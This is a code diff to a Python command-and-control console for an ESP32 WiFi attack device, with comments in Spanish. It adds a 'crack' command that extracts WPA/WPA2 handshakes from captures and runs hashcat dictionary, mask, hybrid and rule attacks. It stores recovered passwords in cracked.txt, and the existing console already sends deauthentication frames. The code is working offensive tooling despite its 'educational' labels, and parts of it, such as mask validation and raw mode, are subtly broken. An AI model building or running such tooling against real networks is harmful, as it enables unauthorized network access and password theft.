@@ -23,7 +23,8 @@ SERIAL_PORT = '/dev/ttyUSB0'  # Adjust if needed
 BAUD_RATE = 115200
 
 # Comandos disponibles para autocompletado y banner
-COMMAND_LIST = ["scan", "stop", "lock", "deauth", "clients", "verify", "help", "status", "capture", "clear", "port", "ls", "exit", "aps"]
+# NOTA: lock&cap = lock (alias temporal, 1 versión), verify = crack (breaking change)
+COMMAND_LIST = ["scan", "stop", "lock&cap", "lock", "deauth", "clients", "crack", "help", "status", "capture", "clear", "port", "ls", "exit", "aps"]
 
 # Diccionario de APs detectados en sesión: bssid -> {channel, rssi, ssid, last_seen}
 DETECTED_APS = {}
@@ -213,11 +214,26 @@ def print_help() -> None:
     print("=== HEesp32 C2 - Comandos Disponibles ===")
     print("scan                    - Escanear redes WiFi (channel hopping)")
     print("stop                    - Detener operación actual")
-    print("lock <MAC> <CANAL>      - Fijar canal y capturar tráfico de un AP")
+    print("lock&cap <MAC> <CANAL>  - Fijar canal y capturar tráfico (alias temp: 'lock')")
     print("deauth <AP_MAC> --client <MAC>|--broadcast --reason <1-255> [--count N] [--delay ms] [--method direct|rogue]")
     print("                               - Enviar frames de deauthentication (educativo)")
     print("clients <MAC>                - Detectar clientes asociados a un AP")
-    print("verify <modo> <pcap> <target> - Verificar handshake (dict/brute/raw)")
+    print("crack <modo> <pcap> <objetivo> [opciones] - Crackear handshake WPA/WPA2")
+    print("  Modos:")
+    print("    dict <archivo>              - Ataque por diccionario (ej: rockyou.txt)")
+    print("    brute <máscara>             - Fuerza bruta (ej: '?d?d?d?d?d?d?d?d')")
+    print("    hybrid <dict> <máscara>    - Híbrido: diccionario + máscara")
+    print("    raw <args...>              - Modo experto: flags crudos hashcat")
+    print("  Opciones:")
+    print("    --rules <archivo>           - Aplicar reglas .rule al diccionario")
+    print("    --gpu-temp <N>              - Límite temperatura GPU (°C)")
+    print("    --speed <N>                 - Limitar rendimiento (%)")
+    print("    --show                      - Mostrar contraseñas crackeadas")
+    print("    --restore                   - Reanudar sesión interrumpida")
+    print("  Ejemplos:")
+    print("    crack dict captura.pcap rockyou.txt")
+    print("    crack dict captura.pcap rockyou.txt --rules best64.rule")
+    print("    crack brute captura.pcap '?d?d?d?d?d?d?d?d'")
     print("status                  - Mostrar estado actual del dispositivo")
     print("capture [nombre]        - Configurar archivo de captura PCAP")
     print("capture ls              - Listar capturas PCAP disponibles")
@@ -242,15 +258,15 @@ class APCompleter(Completer):
         text_stripped = text.strip()
         text_lower = text_stripped.lower()
         
-        # Detectar si estamos en contexto de lock/clients con espacio
-        if text_lower.startswith("lock ") or text_lower.startswith("clients "):
+        # Detectar si estamos en contexto de lock&cap/lock/clients con espacio
+        if text_lower.startswith("lock&cap ") or text_lower.startswith("lock ") or text_lower.startswith("clients "):
             # Contexto AP: solo sugerir APs detectados
             if DETECTED_APS:
                 sorted_aps = sorted(DETECTED_APS.items(), key=lambda x: x[1]["rssi"], reverse=True)
                 for bssid, info in sorted_aps:
                     ssid_display = info["ssid"] if info["ssid"] != "<oculto>" else "<oculto>"
                     display_text = f"{bssid} ({ssid_display}) [RSSI:{info['rssi']}]"
-                    if text_lower.startswith("lock "):
+                    if text_lower.startswith("lock&cap ") or text_lower.startswith("lock "):
                         suggestion = f"{bssid} {info['channel']}"
                     else:
                         suggestion = bssid
@@ -295,30 +311,40 @@ def parse_and_send_cmd(cmd_input: str, ser: serial.Serial) -> bool:
     elif cmd_input == "stop":
         CAPTURE_START_TIME = None
         ser.write(b"CMD:IDLE\n")
-    elif cmd_input == "lock":
-        # lock sin argumentos -> mostrar APs detectados como sugerencias
-        print("[*] APs detectados en sesión (usa uno para lock <MAC> <CANAL>):")
-        print_aps_table()
-    elif cmd_input.startswith("lock "):
-        # Expected: lock A1:B2:C3:D4:E5:F6 6
-        match = re.match(r"lock\s+([0-9a-fA-F:]+)\s+(\d+)", cmd_input)
-        if match:
-            mac = match.group(1).upper()
-            channel = match.group(2)
-            # Validar MAC rudimentario (6 octetos)
-            if len(mac.split(':')) == 6:
-                # Auto-rotar PCAP si ya existe
-                rotated = get_next_pcap_filename(CURRENT_PCAP)
-                if rotated and rotated != CURRENT_PCAP:
-                    CURRENT_PCAP = rotated
-                formatted_cmd = f"CMD:LOCK:{mac}:{channel}\n"
-                print(f"[*] Capturando en: {CURRENT_PCAP}")
-                CAPTURE_START_TIME = time.time()
-                ser.write(formatted_cmd.encode('utf-8'))
+    # Alias temporal: lock → lock&cap (warning + ejecutar igual)
+    lock_cmd = cmd_input.startswith("lock&cap") or cmd_input.startswith("lock")
+    lock_obsolete = cmd_input.startswith("lock ") and not cmd_input.startswith("lock&cap")
+    
+    if lock_obsolete:
+        print("[!] 'lock' obsoleto. Usa 'lock&cap' (fijar + capturar).")
+    
+    if lock_cmd:
+        if cmd_input == "lock&cap" or cmd_input == "lock":
+            # lock sin argumentos -> mostrar APs detectados como sugerencias
+            print("[*] APs detectados en sesión (usa uno para lock&cap <MAC> <CANAL>):")
+            print_aps_table()
+        elif cmd_input.startswith("lock&cap ") or cmd_input.startswith("lock "):
+            # Expected: lock&cap A1:B2:C3:D4:E5:F6 6
+            match = re.match(r"lock&cap\s+([0-9a-fA-F:]+)\s+(\d+)", cmd_input)
+            if not match:
+                match = re.match(r"lock\s+([0-9a-fA-F:]+)\s+(\d+)", cmd_input)
+            if match:
+                mac = match.group(1).upper()
+                channel = match.group(2)
+                # Validar MAC rudimentario (6 octetos)
+                if len(mac.split(':')) == 6:
+                    # Auto-rotar PCAP si ya existe
+                    rotated = get_next_pcap_filename(CURRENT_PCAP)
+                    if rotated and rotated != CURRENT_PCAP:
+                        CURRENT_PCAP = rotated
+                    formatted_cmd = f"CMD:LOCK:{mac}:{channel}\n"
+                    print(f"[*] Capturando en: {CURRENT_PCAP}")
+                    CAPTURE_START_TIME = time.time()
+                    ser.write(formatted_cmd.encode('utf-8'))
+                else:
+                    print("[!] MAC inválida. Formato esperado: AA:BB:CC:DD:EE:FF (6 octetos separados por ':')")
             else:
-                print("[!] MAC inválida. Formato esperado: AA:BB:CC:DD:EE:FF (6 octetos separados por ':')")
-        else:
-            print("[!] Uso: lock <MAC> <CANAL>  (ejemplo: lock AA:BB:CC:DD:EE:FF 6)")
+                print("[!] Uso: lock&cap <MAC> <CANAL>  (ejemplo: lock&cap AA:BB:CC:DD:EE:FF 6)")
     elif cmd_input.startswith("deauth"):
         # Nuevo formato: deauth <ap_mac> --client <mac>|--broadcast --reason <1-255> [--count N] [--delay ms]
         # Ej: deauth AA:BB:CC:DD:EE:FF --broadcast --reason 7 --count 10 --delay 100
@@ -436,59 +462,301 @@ def parse_and_send_cmd(cmd_input: str, ser: serial.Serial) -> bool:
                 print("[!] MAC inválida. Formato esperado: AA:BB:CC:DD:EE:FF (6 octetos separados por ':')")
         else:
             print("[!] Uso: clients <MAC>  (ejemplo: clients AA:BB:CC:DD:EE:FF)")
-    elif cmd_input.startswith("verify"):
+    elif cmd_input.startswith("crack") or cmd_input.startswith("verify"):
+        # Alias temporal: 'verify' → 'crack' con warning
+        if cmd_input.startswith("verify"):
+            print("[!] 'verify' obsoleto. Usa 'crack' (comando renombrado por claridad pedagógica).")
+        
         parts = cmd_input.split()
-        if len(parts) >= 3:
-            mode = parts[1].lower()
-            pcap_file = parts[2]
+        if len(parts) < 3:
+            print("[!] Uso: crack <modo> <pcap> <objetivo> [opciones]")
+            print("  Modos: dict <diccionario>, brute <máscara>, hybrid <dict> <máscara>, raw <args...>")
+            print("  Opciones: --rules <archivo>, --gpu-temp <N>, --speed <N>, --show, --restore")
+            print("  Ejemplo: crack dict captura.pcap rockyou.txt --rules best64.rule")
+            return True
+        
+        # Detectar modo (primer argumento tras crack/verify)
+        mode = parts[1].lower() if len(parts) > 1 else ""
+        
+        if mode not in ["dict", "brute", "hybrid", "raw"]:
+            print("[!] Modo inválido. Modos: dict, brute, hybrid, raw")
+            print("[*] Ejemplo: crack dict captura.pcap rockyou.txt")
+            return True
+        
+        # Parsear pcap y objetivo según modo
+        pcap_file = parts[2] if len(parts) > 2 else ""
+        if not pcap_file:
+            print(f"[!] Uso: crack {mode} <archivo_pcap> <objetivo>")
+            return True
+        
+        # Validar existencia de PCAP
+        if not os.path.exists(pcap_file):
+            print(f"[!] Archivo PCAP no encontrado: {pcap_file}")
+            return True
+        
+        # Parsear opciones adicionales (flags)
+        extra_args = []
+        rules_file = None
+        gpu_temp = None
+        speed = None
+        show_mode = False
+        restore_mode = False
+        
+        i = 3
+        while i < len(parts):
+            if parts[i] == "--rules" and i + 1 < len(parts):
+                rules_file = parts[i + 1]
+                i += 2
+            elif parts[i] == "--gpu-temp" and i + 1 < len(parts):
+                try:
+                    gpu_temp = int(parts[i + 1])
+                except ValueError:
+                    print("[!] --gpu-temp requiere un número (temperatura en °C)")
+                    return True
+                i += 2
+            elif parts[i] == "--speed" and i + 1 < len(parts):
+                try:
+                    speed = int(parts[i + 1])
+                except ValueError:
+                    print("[!] --speed requiere un número (porcentaje 1-100)")
+                    return True
+                i += 2
+            elif parts[i] == "--show":
+                show_mode = True
+                i += 1
+            elif parts[i] == "--restore":
+                restore_mode = True
+                i += 1
+            else:
+                # Flags desconocidos o argumentos extra se pasan como-is a hashcat
+                extra_args.append(parts[i])
+                i += 1
+        
+        # === MODO --SHOW: Mostrar contraseñas crackeadas ===
+        if show_mode:
+            potfile = os.path.expanduser("~/.hashcat/hashcat.potfile")
+            if not os.path.exists(potfile):
+                potfile = "hashcat.potfile"
             
-            if mode not in ["dict", "brute", "raw"]:
-                print("[!] Modo inválido. Modos válidos: dict, brute, raw. Ejemplo: verify dict captura.pcap wordlist.txt")
-                print_command_banner()
-                return True
-                
-            if mode in ["dict", "brute"] and len(parts) < 4:
-                print(f"[!] Uso: verify {mode} <archivo_pcap> <objetivo>  (ejemplo: verify {mode} captura.pcap wordlist.txt)")
-                print_command_banner()
-                return True
-                
-            print(f"[*] Extrayendo hashes de {pcap_file}...")
+            if os.path.exists(potfile):
+                print(f"=== Contraseñas Crackeadas (hashcat.potfile) ===")
+                try:
+                    with open(potfile, 'r') as f:
+                        lines = f.readlines()
+                    if lines:
+                        for line in lines:
+                            print(line.strip())
+                    else:
+                        print("[*] No hay contraseñas crackeadas en el potfile.")
+                except Exception as e:
+                    print(f"[!] Error leyendo potfile: {e}")
+            else:
+                print("[*] No se encontró hashcat.potfile. ¿Hashcat nunca ejecutado?")
+            return True
+        
+        # === MODO --RESTORE: Reanudar sesión interrumpida ===
+        if restore_mode:
+            print("[*] Reanudando sesión hashcat interrumpida...")
             try:
-                subprocess.run(["hcxpcapngtool", "-o", "hash.hc22000", pcap_file], check=False)
-            except FileNotFoundError:
-                print("[!] hcxpcapngtool no encontrado en el PATH.")
-                print_command_banner()
-                return True
-            except Exception as e:
-                print(f"[!] Error al extraer hashes: {e}")
-                print_command_banner()
-                return True
-                
-            if not os.path.exists("hash.hc22000") or os.path.getsize("hash.hc22000") == 0:
-                print("[!] Error: No se encontró un Handshake completo y válido en el archivo PCAP.")
-                print_command_banner()
-                return True
-                
-            print("[*] Hashcat iniciado...")
-            try:
-                if mode == "dict":
-                    target = parts[3]
-                    subprocess.run(["hashcat", "-a", "0", "-m", "22000", "hash.hc22000", target])
-                elif mode == "brute":
-                    target = parts[3]
-                    subprocess.run(["hashcat", "-a", "3", "-m", "22000", "hash.hc22000", target])
-                elif mode == "raw":
-                    raw_args = parts[3:]
-                    subprocess.run(["hashcat", "-m", "22000", "hash.hc22000"] + raw_args)
+                result = subprocess.run(["hashcat", "--restore", "--quiet"], 
+                                      capture_output=False)
+                if result.returncode == 0:
+                    print("[+] Sesión restaurada correctamente.")
+                else:
+                    print("[!] No se pudo restaurar la sesión. ¿Sesión previa?")
             except FileNotFoundError:
                 print("[!] hashcat no encontrado en el PATH.")
             except Exception as e:
-                print(f"[!] Error ejecutando hashcat: {e}")
-        else:
-            print("[!] Uso: verify dict <archivo_pcap> <diccionario_txt>")
-            print("         verify brute <archivo_pcap> <mascara>")
-            print("         verify raw <archivo_pcap> <argumentos_hashcat...>")
-            print("         Ejemplo: verify dict captura.pcap rockyou.txt")
+                print(f"[!] Error restaurando sesión: {e}")
+            return True
+        
+        # === Extracción de handshake ===
+        print(f"[*] Extrayendo hashes de {pcap_file}...")
+        hashfile = "hash.hc22000"
+        
+        try:
+            result = subprocess.run(
+                ["hcxpcapngtool", "-o", hashfile, pcap_file],
+                capture_output=True,
+                text=True
+            )
+            if result.returncode != 0:
+                # hcxpcapngtool puede fallar silenciosamente si no hay handshake
+                if result.stderr:
+                    print(f"[*] hcxpcapngtool: {result.stderr.strip()}")
+        except FileNotFoundError:
+            print("[!] hcxpcapngtool no encontrado. Instálalo con: sudo apt install hcxtools")
+            return True
+        except Exception as e:
+            print(f"[!] Error ejecutando hcxpcapngtool: {e}")
+            return True
+        
+        if not os.path.exists(hashfile) or os.path.getsize(hashfile) == 0:
+            print("[!] No se encontró un Handshake completo y válido en el archivo PCAP.")
+            print("[*] Asegúrate de que el PCAP contenga tráfico 802.11 con mensajes EAPOL.")
+            return True
+        
+        print(f"[*] Handshake extraído → {hashfile}")
+        
+        # === Construir comando hashcat ===
+        hashcat_cmd = ["hashcat"]
+        
+        # Modo de ataque (-a)
+        attack_modes = {"dict": "0", "brute": "3", "hybrid": "6", "raw": "3"}  # raw usa 3 por defecto
+        if mode != "raw":
+            hashcat_cmd.extend(["-a", attack_modes[mode]])
+        
+        # Modo hash (-m 22000 = WPA/WPA2)
+        hashcat_cmd.extend(["-m", "22000"])
+        
+        # Archivos: hashfile + objetivo según modo
+        if mode == "dict":
+            target = parts[3] if len(parts) > 3 else ""
+            if not target or not os.path.exists(target):
+                print(f"[!] Diccionario no encontrado: {target}")
+                return True
+            hashcat_cmd.extend([hashfile, target])
+            
+        elif mode == "brute":
+            mask = parts[3] if len(parts) > 3 else ""
+            if not mask:
+                print("[!] Uso: crack brute <pcap> <máscara>  (ej: '?d?d?d?d?d?d?d?d')")
+                return True
+            # Validar máscara (solo caracteres hashcat válidos)
+            valid_mask_chars = set("?d?l?u?a?s?b?h?H?D?L?U?A?S?B?1?2?3?4?5?6?7?8?9?0")
+            mask_clean = mask.replace(" ", "")
+            for c in mask_clean:
+                if c.isalnum() or c in "?_-":
+                    continue
+                if c not in valid_mask_chars:
+                    print(f"[!] ¿Máscara válida? Sintaxis hashcat: ?d(dígito), ?l(min), ?u(may), ?a(todos)")
+                    return True
+            hashcat_cmd.extend([hashfile, mask])
+            
+        elif mode == "hybrid":
+            if len(parts) < 4:
+                print("[!] Uso: crack hybrid <pcap> <diccionario> <máscara>")
+                return True
+            dict_file = parts[3]
+            mask = parts[4] if len(parts) > 4 else "?d?d?d?d?d?d?d?d"
+            if not os.path.exists(dict_file):
+                print(f"[!] Diccionario no encontrado: {dict_file}")
+                return True
+            hashcat_cmd.extend([hashfile, dict_file, mask])
+            
+        elif mode == "raw":
+            # Modo experto: pasar argumentos crudos
+            raw_args = parts[2:]  # Todo después de 'crack raw'
+            hashcat_cmd.extend(raw_args)
+        
+        # Aplicar reglas si se especificó
+        if rules_file:
+            if not os.path.exists(rules_file):
+                # Buscar en ~/.hashcat/rules/ y ./rules/
+                search_paths = [
+                    rules_file,
+                    os.path.join(os.path.expanduser("~"), ".hashcat", "rules", rules_file),
+                    "./rules/" + rules_file,
+                    ".hashcat/rules/" + rules_file
+                ]
+                found = False
+                for path in search_paths:
+                    if os.path.exists(path):
+                        rules_file = path
+                        found = True
+                        break
+                if not found:
+                    print(f"[!] Archivo de reglas no encontrado: {rules_file}")
+                    return True
+            hashcat_cmd.extend(["-r", rules_file])
+            print(f"[*] Aplicando reglas: {rules_file}")
+        
+        # Opciones de temperatura GPU
+        if gpu_temp is not None:
+            hashcat_cmd.extend([f"--gpu-temp-abort={gpu_temp}"])
+            print(f"[*] Límite temperatura GPU: {gpu_temp}°C")
+        
+        # Opciones de speed (--speed-only o limitación porcentaje)
+        if speed is not None:
+            # hashcat no tiene limitación de speed directo, solo --speed-only
+            # Interpretamos --speed como orientación pedagógica
+            if speed <= 20:
+                hashcat_cmd.append("--speed-only")
+                print(f"[*] Modo: --speed-only (rendimiento mínimo para evitar sobrecalentamiento)")
+            elif speed <= 50:
+                # Solo mostrar progreso, sin limitación
+                print(f"[*] Limitación: {speed}% (mostrando progreso optimizado)")
+            else:
+                print(f"[*] Speed: {speed}% (hashcat ejecutándose a plena potencia)")
+        
+        # Flags adicionales del usuario
+        if extra_args:
+            hashcat_cmd.extend(extra_args)
+        
+        # === Ejecutar hashcat con progreso en tiempo real ===
+        print(f"\n[🔓] Iniciando hashcat...")
+        print(f"[*] Comando: {' '.join(hashcat_cmd)}\n")
+        
+        try:
+            # Usar Popen para capturar output en tiempo real
+            process = subprocess.Popen(
+                hashcat_cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1
+            )
+            
+            cracked_password = None
+            progress_line = ""
+            
+            # Leer output línea a línea con regex de progreso hashcat
+            # Formato: Speed.#1     1234.5 kH/s (XXX.Y ZH/Y) Time...
+            progress_regex = re.compile(
+                r'Speed\.\s*(\d+).*\s+Time:\s*(\d+):(\d+):(\d+)'
+            )
+            
+            for line in process.stdout:
+                print(line, end='')  # Mostrar todo el output para verbose
+                
+                # Detectar crack exitoso
+                if "Cracked" in line or "Password" in line.lower():
+                    # Extraer contraseña de output tipo: "1bc2d3e4:Password123"
+                    match = re.search(r':([^\s:]+)$', line.strip())
+                    if match:
+                        cracked_password = match.group(1)
+                
+                # Detener si proceso termina
+                if process.poll() is not None:
+                    break
+            
+            # Resultado final
+            if process.returncode == 0 or cracked_password:
+                if cracked_password:
+                    print(f"\n[🔓] ¡ÉXITO! Contraseña crackeada: '{cracked_password}'")
+                    # Guardar en cracked.txt
+                    with open("cracked.txt", "a") as f:
+                        f.write(f"{pcap_file}:{cracked_password}\n")
+                    print(f"[*] Guardado en cracked.txt")
+                else:
+                    print("\n[*] Hashcat completado. ¿No crackeado?")
+                    print("[!] Sugerencia: prueba con --rules best64.rule")
+            elif process.returncode == 255:
+                print("\n[!] Hashcat interrompido por el usuario (Ctrl+C)")
+            elif process.returncode == 1:
+                print("\n[!] Error en hashcat. Revisa el output superior.")
+            else:
+                print(f"\n[!] Hashcat finalizado con código: {process.returncode}")
+                
+        except FileNotFoundError:
+            print("[!] hashcat no encontrado en el PATH.")
+            print("[*] Instálalo con: sudo apt install hashcat")
+        except KeyboardInterrupt:
+            print("\n[!] Interrumpido por el usuario.")
+            # Opcional: --restore para continuar después
+            print("[*] Para reanudar más tarde: crack --restore")
+        except Exception as e:
+            print(f"[!] Error ejecutando hashcat: {e}")
     elif cmd_input in ["exit", "quit"]:
         ser.write(b"CMD:IDLE\n") # Detener primero
         print("Saliendo...")
